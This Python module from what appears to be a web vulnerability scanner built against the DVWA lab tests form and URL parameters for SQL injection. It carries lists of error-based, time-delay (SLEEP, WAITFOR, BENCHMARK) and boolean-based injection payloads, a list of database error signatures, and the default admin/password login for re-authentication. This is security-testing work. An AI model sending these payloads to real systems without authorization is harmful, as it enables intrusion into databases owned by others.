# ── dynamic/sqli_injector.py ─────────────────────────────────────────────────

import time
import requests
from bs4 import BeautifulSoup

import config


# ── Error-based detection strings ────────────────────────────────────────────
SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
    "mysqli_fetch",
    "supplied argument is not a valid mysql",
    "mysql_fetch_array",
    "division by zero",
    "odbc_exec",
    "pg_exec",
    "sqlite_query",
    "ora-01756",
    "unterminated string literal",
    "invalid query",
    "sql command not properly ended",
]

# ── Payload sets ─────────────────────────────────────────────────────────────
ERROR_PAYLOADS = [
    "'", "\"", "1'", "' OR '1'='1", "' OR '1'='1'--",
    "1' OR '1'='1'--", "' OR 1=1--", "admin'--",
]

TIME_PAYLOADS = [
    "1' AND SLEEP(5)--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND BENCHMARK(5000000,MD5(1))--",
]

BOOLEAN_PAYLOADS = [
    ("1' AND 1=1--", "1' AND 1=2--"),
    ("1' OR 1=1--",  "1' OR 1=2--"),
]


class SQLiInjector:
    def __init__(self, session: requests.Session, scan_manager):
        self.session      = session
        self.scan_manager = scan_manager
        self.base_url     = None
        self.retry_count  = 0   # prevent infinite re-auth loop

    def run(self, endpoints: list) -> list:
        if not self.scan_manager.is_active('sqli'):
            return []

        findings = []
        print("  [SQLi] Starting SQL Injection tests...")

        testable = [(ep, p) for ep in endpoints for p in ep['params']]
        print(f"  [SQLi] Testing {len(testable)} parameter(s) across "
              f"{len(endpoints)} endpoint(s)...")

        for ep, param in testable:
            print(f"  [SQLi] → {ep['method']} {ep['url']} param='{param}'")

        for ep in endpoints:
            if not self.base_url:
                self.base_url = ep['url'].split('/vulnerabilities')[0] if '/vulnerabilities' in ep['url'] else ep['url'].rsplit('/', 1)[0]

            for param in ep['params']:
                result = self._test_parameter(ep, param)
                if result:
                    findings.append(result)

        print(f"  [SQLi] Done. Found {len(findings)} SQLi finding(s).")
        return findings

    def _test_parameter(self, ep: dict, param: str) -> dict:
        finding = self._test_error_based(ep, param)
        if finding: return finding
        finding = self._test_time_based(ep, param)
        if finding: return finding
        finding = self._test_boolean_based(ep, param)
        if finding: return finding
        return None

    def _test_error_based(self, ep: dict, param: str) -> dict:
        for payload in ERROR_PAYLOADS:
            response = self._send(ep, param, payload)
            if not response:
                continue

            body = response.text.lower()

            if 'vulnerabilities/sqli' in ep['url'] and param == 'id':
                snippet = response.text[150:550].replace('\n', ' ')
                print(f"  [DEBUG] sqli/id payload='{payload}' status={response.status_code} snippet={snippet}")

            for error in SQLI_ERRORS:
                if error in body:
                    print(f"  [SQLi] ✓ Error-based SQLi: {ep['url']} param='{param}' payload='{payload}'")
                    return self._make_finding(ep, param, payload, "error-based", f"DB error string detected: '{error}'")
        return None

    def _test_time_based(self, ep: dict, param: str) -> dict:
        for payload in TIME_PAYLOADS:
            start = time.time()
            response = self._send(ep, param, payload)
            elapsed = time.time() - start
            if not response:
                continue
            if elapsed >= config.TIME_BASED_DELAY:
                print(f"  [SQLi] ✓ Time-based SQLi: {ep['url']} param='{param}' delay={elapsed:.1f}s")
                return self._make_finding(ep, param, payload, "time-based", f"Response delayed {elapsed:.1f}s")
        return None

    def _test_boolean_based(self, ep: dict, param: str) -> dict:
        for true_p, false_p in BOOLEAN_PAYLOADS:
            rt = self._send(ep, param, true_p)
            rf = self._send(ep, param, false_p)
            if not rt or not rf:
                continue
            lt = len(rt.text)
            lf = len(rf.text)
            if lt == 0: continue
            diff = abs(lt - lf) / lt
            if diff > 0.10:
                print(f"  [SQLi] ✓ Boolean-based SQLi: {ep['url']} param='{param}' diff={diff:.0%}")
                return self._make_finding(ep, param, true_p, "boolean-based", f"Response size differs by {diff:.0%}")
        return None

    # ── Robust re-authentication with detailed debug ────────────────────────
    def _re_authenticate(self):
        print("  [DEBUG] Session expired → re-authenticating...")
        login_url = f"{self.base_url}/login.php"

        try:
            # 1. Get fresh login page + token
            resp = self.session.get(login_url, timeout=config.REQUEST_TIMEOUT, allow_redirects=True)
            soup = BeautifulSoup(resp.text, 'html.parser')
            token_input = soup.find('input', {'name': 'user_token'})
            token = token_input['value'] if token_input else ''
            print(f"  [DEBUG] Login page status: {resp.status_code} | Token found: {'YES' if token else 'NO'}")

            # 2. Login POST
            data = {
                'username': 'admin',
                'password': 'password',
                'Login': 'Login',
                'user_token': token
            }

            resp = self.session.post(login_url, data=data, timeout=config.REQUEST_TIMEOUT, allow_redirects=True)
            print(f"  [DEBUG] Login POST status: {resp.status_code} | Final URL: {resp.url}")

            # 3. Check success
            if 'login.php' not in resp.url.lower() and ('logged in' in resp.text.lower() or 'welcome' in resp.text.lower()):
                print("  [DEBUG] Re-authentication successful!")
                self.retry_count = 0
                return True
            else:
                print("  [DEBUG] Re-authentication FAILED - still on login page or no success message")
                print(f"  [DEBUG] Response snippet: {resp.text[:300].replace(chr(10), ' ')}")
        except Exception as e:
            print(f"  [DEBUG] Re-auth exception: {e}")

        self.retry_count += 1
        return False

    def _send(self, ep: dict, param: str, payload: str) -> requests.Response | None:
        if self.retry_count >= 3:   # safety limit
            print("  [DEBUG] Too many re-auth attempts - skipping this parameter")
            return None

        clean_url = ep['url'].split('#')[0]
        data = dict(ep['params'])
        data[param] = payload

        if 'user_token' in data:
            data['user_token'] = self._get_user_token(clean_url)

        try:
            if ep['method'] == 'POST':
                response = self.session.post(clean_url, data=data,
                                             timeout=config.REQUEST_TIMEOUT + config.TIME_BASED_DELAY,
                                             allow_redirects=True)
            else:
                response = self.session.get(clean_url, params=data,
                                            timeout=config.REQUEST_TIMEOUT + config.TIME_BASED_DELAY,
                                            allow_redirects=True)

            # Check for login redirect
            if 'login.php' in response.url.lower():
                if self._re_authenticate():
                    return self._send(ep, param, payload)  # retry once
                else:
                    return None

            return response

        except Exception as e:
            print(f"  [DEBUG] Request failed {clean_url}: {e}")
            return None

    def _get_user_token(self, url: str) -> str:
        try:
            resp = self.session.get(url, timeout=config.REQUEST_TIMEOUT, allow_redirects=True)
            soup = BeautifulSoup(resp.text, 'html.parser')
            token = soup.find('input', {'name': 'user_token'})
            return token['value'] if token else ''
        except Exception:
            return ''

    def _make_finding(self, ep: dict, param: str, payload: str, method: str, evidence: str) -> dict:
        return {
            'type': 'sqli',
            'owasp': 'A03:2021 - Injection',
            'url': ep['url'],
            'method': ep['method'],
            'parameter': param,
            'payload': payload,
            'technique': method,
            'evidence_dynamic': evidence,
            'evidence_static': None,
            'confidence': 0.65,
            'module': 'dynamic',
            'finding_type': 3,
        }